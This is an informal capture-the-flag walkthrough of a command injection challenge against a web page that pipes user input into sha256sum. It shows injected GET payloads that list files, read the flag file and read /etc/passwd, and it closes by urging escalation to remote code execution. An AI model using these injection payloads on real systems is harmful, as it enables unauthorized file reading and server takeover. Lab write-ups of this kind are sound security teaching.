Challenge 046 : Medium Level command injection

It's a simple web page that converts to sha256 prolly
let's try some random inputs

try me || uname -a
;ls -al
try me; ls

notice carefully at the end there is "-" sign which is linuxcli md5sum program (Google it)
it gives us the idea that command at the backend is something like : echo "string" | sha256sum


GET /index.php?string=try  :  (try)
        95fdbdf2fea4b306d059facf26c18d94cb190189a3221008eca14c5dd0b0fce1  -

GET /index.php?string=lol;%20try   :  (lol; try)   
	e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855  -

GET /index.php?string=lol;%20echo%20try    :   (lol; echo try)
	95fdbdf2fea4b306d059facf26c18d94cb190189a3221008eca14c5dd0b0fce1  -

The output of 1 and 3 is same, so it does mean that 
the command goes like
echo lol; echo try | sha56sum   .. so it prints lol first and then applies sha256sum on try

so, command injection is possible :D

let's try :  try me;ls -al; something
	     lol%3Bls%20-al;echo+try

it will list all the files in that directory.. and there's ur file : EPL.txt

get value : lol%3Bcat%20EPL.txt;echo+try
get request :  test;%20cat%20/etc/passwd;%20something
cat file EPL.txt to get the flag i.e. : thenew_flag

you can play around now leading this to Remote Code Execution on the main server.. there might be something more hidden on it ;)
